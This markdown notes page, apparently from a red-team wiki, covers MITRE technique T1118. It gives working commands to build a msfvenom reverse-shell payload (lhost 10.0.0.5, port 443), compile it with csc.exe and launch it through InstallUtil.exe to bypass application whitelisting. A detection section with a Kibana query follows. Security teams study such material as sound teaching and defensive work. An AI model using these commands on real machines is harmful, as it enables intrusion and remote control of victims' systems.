---
description: InstallUtil code execution - bypass application whitelisting.
tags: [#code-execution]
---

# InstallUtil

## Execution

First of, let's generate a C\# payload \(with [InstallUtil script](https://github.com/khr0x40sh/WhiteListEvasion)\) that contains shellcode from msfvenom and upload the temp.cs file to victim's machine:

```csharp
// attacker@local
python InstallUtil.py --cs_file temp.cs --exe_file temp.exe --payload windowsreverse_shell_tcp --lhost 10.0.0.5 --lport 443
```

Compile the .cs to an .exe:

```csharp
// attacker@victim
PS C:\Windows\Microsoft.NET\Framework\v4.0.30319> .\csc.exe C:\experiments\installUtil\temp.cs
```

Execute the payload:

```csharp
// attacker@victim
PS C:\Windows\Microsoft.NET\Framework\v4.0.30319> .\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Microsoft.NET\Framework\v4.0.30319\temp.exe
Microsoft (R) .NET Framework Installation utility Version 4.0.30319.17929
Copyright (C) Microsoft Corporation.  All rights reserved.

Hello From Uninstall...I carry out the real work...
```

Enjoy the sweet reverse shell:

![[installutil-shell.png]]

## Observations

Look for `InstallUtil` processes that have established connections, especially those with cmd or powershell processes running as children - you should treat them as suspicious and investigate the endpoint closer:

![[installutil-procexp.png]]

A very primitive query in kibana allowing to find events where InstallUtil spawns cmd:

```text
// kibana
event_data.ParentCommandLine:"*installutil.exe*" && event_data.Image:cmd.exe
```

![[installutil-kibana.png|InstallUtil launching the malicious payload]]

![[installutils-csc.png|csc.exe created a temp.exe which contains the reverse shell payload]]

What is interesting is that I could not see an established network connection logged in sysmon logs, although I could see other network connections from the victim machine being logged.

> [!DANGER]
> Will be coming back to this one for further inspection - possibly related to sysmon configuration.

## References

[attack.mitre.org/wiki/Technique/T1118](https://attack.mitre.org/wiki/Technique/T1118)

[github.com/khr0x40sh/WhiteListEvasion](https://github.com/khr0x40sh/WhiteListEvasion)

